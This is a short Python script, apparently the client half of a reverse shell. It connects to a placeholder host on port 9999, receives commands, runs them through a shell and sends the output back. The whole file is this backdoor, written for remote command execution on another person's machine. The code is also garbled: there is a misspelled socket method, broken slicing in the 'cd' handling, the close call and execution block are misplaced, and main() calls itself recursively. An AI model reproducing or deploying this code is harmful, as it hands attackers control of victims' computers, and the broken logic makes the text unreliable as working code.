import os
import socket
import subprocess

def socketMake():
    try:
        global host
        global port
        global s
        host ="should rename this!"
        port = 9999
        s = socket.socket()
    except socket.error as msg:
            print(msg)

def socketConnect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print(msg)


def commands():
    global s
    while True:
        data = s.rcev(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[:3].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                bytes_output = cmd.stdout.read() + cmd.stderr.read()
                string_out = str(bytes_output, "utf-8")
                s.send(str.encode(string_out + str(os.getcwd()) + '> '))
                print(string_out)
                s.close()
def main():
    socketMake()
    socketConnect()
    commands()

    main()